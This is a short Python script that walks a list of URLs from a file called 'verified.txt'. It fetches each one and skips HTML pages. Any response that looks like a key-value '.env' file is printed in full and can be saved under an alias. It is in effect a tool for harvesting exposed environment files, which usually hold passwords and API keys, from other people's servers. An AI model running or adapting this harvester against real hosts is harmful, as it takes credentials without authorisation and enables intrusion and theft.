# THIS IS CRAP CODE!

import requests, os

def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


s = requests.Session()
IPs = []
for _ in open("verified.txt", "r").readlines():
    IPs.append(_.strip())

for _ in IPs:
    try:
        r = s.get(_.strip(), timeout=5)
        if "<html" in r.text or "<HTM" in r.text or "<script" in r.text or "<image" in r.text or "<div" in r.text or "<b" in r.text or "":
            print("[BAD] " + _)
        elif "=" in r.text:
            print("---------------------- START ENV " + _ + " ----------------------")
            print(r.text)
            print("---------------------- END ENV " + _ + " ----------------------")
            save = input("Would you like to save this .env file (y/n)? ")
            if save == "y":
                alias = input("Insert alias: ")
                print(r.text, file=open(alias + "(" + _.strip().replace("http://", "").replace("/", ")"), "w"))
            clear()
        else:
            print(r.text)
    except Exception as E:
        print(E)